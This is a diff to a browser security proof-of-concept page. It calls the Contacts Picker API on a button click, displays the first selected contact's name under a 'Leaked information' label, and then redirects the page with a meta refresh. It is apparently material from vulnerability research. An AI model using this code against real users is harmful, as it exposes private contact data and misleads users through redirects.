@@ -6,24 +6,24 @@
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
     <script>
-        onclick = async () => {
-            (async () => {
-                let contacts = await navigator.contacts.select(["name"], {});
-                document.write(`
-                    <h1>
-                        <font color="red">Leaked information:</font> ${contacts[0]["name"]}
-                    </h1>
-                `);
+        async function runPoC() {
+            let contacts = await navigator.contacts.select(["name"], {});
 
-                // Replace open() with meta refresh
-                let meta = document.createElement("meta");
-                meta.httpEquiv = "refresh";
-                meta.content = "0;url=https://www.google.com";
-                document.head.appendChild(meta);
-            })();
+            document.body.innerHTML = `
+                <h1>
+                    <font color="red">Leaked information:</font> ${contacts[0]["name"]}
+                </h1>
+            `;
+
+            // Meta refresh redirect
+            let meta = document.createElement("meta");
+            meta.httpEquiv = "refresh";
+            meta.content = "2;url=https://www.jody.com";
+            document.head.appendChild(meta);
         }
     </script>
 </head>
 <body>
+    <button onclick="runPoC()">Click Me</button>
 </body>
 </html>
